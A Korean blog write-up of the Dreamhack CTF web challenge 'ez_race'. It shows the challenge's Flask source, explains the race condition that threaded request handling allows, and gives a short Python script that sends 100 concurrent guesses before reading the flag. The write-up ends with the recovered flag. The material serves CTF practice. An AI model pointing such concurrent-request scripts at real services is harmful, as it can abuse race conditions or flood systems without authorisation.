---
title: "Dreamhack ez_race 풀이"
description: "1~100의 동시 요청으로 레이스 조건을 이용하는 Dreamhack 문제 풀이."
category: "Dreamhack Web"
tags: ["Dreamhack","Web","Race Condition"]
createdAt: "2026-11-05"
updatedAt: "2026-11-05"
draft: false
notionSource: "3505747616b280da90a8c644a0ae5c10"
---

<p id="35057476-16b2-80ed-ab84-f221a73dac09" class="" dir="auto">문제 파일을 다운 받아 열어보면 이러한 파이썬 코드가 있다. </p><pre id="35057476-16b2-80fe-895e-c0f7b3280ca5" class="code code-wrap" data-notion-code-syntax="python"><code class="language-python">from flask import Flask, request
import random
import time

app = Flask(__name__)
FLAG = "4TH3N3{**redacted**}"
getflag = 0

key = random.randint(1, 100)

@app.route('/')
def home():
    return "3초 안에 키를 찾을 수 있나요?"

@app.route('/race')
def race():
    global getflag, key

    user_input_str = request.args.get('user')
    if user_input_str is None:
        return "Please use user parameter"

    try:
        userinput = int(user_input_str)
    except ValueError:
        return "ERROR"

    if userinput == key:
        getflag = 1
        return "WOW"
    else:
        time.sleep(3)
        key = random.randint(1, 100)
        return "NOPE"

@app.route('/flag')
def flag():
    global getflag
    if getflag == 1:
        getflag = 0
        return f"FLAG IS {FLAG}"
    else:
        return "NOPE!!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, threaded=True)
</code></pre><p id="35057476-16b2-8001-89ae-fe373e20f975" class="" dir="auto">문제에서 제공된 Flask 코드는 /race와 /flag 라우트를 가지고 있다. 사용자는 /race 라우트에 user 파라미터로 숫자를 전달할 수 있다. 서버 내부에는 1부터 100까지의 랜덤 숫자인 key가 존재하고 사용자가 입력한 값이 이 key와 같으면 getflag 값이 1로 변경된다.</p><p id="35057476-16b2-8080-b273-fa95a5894f0b" class="" dir="auto">그 후, /flag 라우트에 접근하면 getflag값이 1인지 확인하고, 1이라면 플래그를 출력하는 코드이다.</p><p id="35057476-16b2-8016-8d8e-fce46d472447" class="" dir="auto">핵심은 코드 마지막에 있는 __main__ 부분에 있다. 서버 실행 시 threaded = True 옵션이 설정되어 있어 여러 요청을 동시에 처리할 수 있다.</p><p id="35057476-16b2-800c-8bc4-cd218e7c0a61" class="" dir="auto">익스플로잇 코드:</p><pre id="35057476-16b2-80a1-ba57-fd5c8378d92f" class="code code-wrap" data-notion-code-syntax="python"><code class="language-python">import requests
import threading

URL = ""

def attack(n):
    requests.get(f"{URL}/race?user={n}")

threads = []
for i in range(1, 101):
    t = threading.Thread(target=attack, args=(i,))
    t.start()
    threads.append(t)

res = requests.get(f"{URL}/flag")
print(res.text)</code></pre><p id="35057476-16b2-80cd-955c-e0c42509372b" class="" dir="auto">코드는 외부 라이브러리인 requests와 threading 모듈을 사용하여 구현하였다. requests 모듈은 HTTP 요청을 보내기 위해 사용되고 threading 모듈은 여러 요청을 동시에 보내기 위해 사용된다.</p><p id="35057476-16b2-80d8-8f4b-dc588d559276" class="" dir="auto">드림핵 사이트에서 VM Request를 한 후 URL을 익스플로잇 코드에 대입해서 실행하면..</p><p id="35057476-16b2-801b-9db4-dda267fe04f5" class="" dir="auto">이렇게 플래그를 얻을 수 있다</p><pre id="35057476-16b2-8021-bf70-f915294a71cf" class="code code-wrap" data-notion-code-syntax="python"><code class="language-python"> 4TH3N3{you_so_fast!!!ZnVqaXRha290b25l}</code></pre>
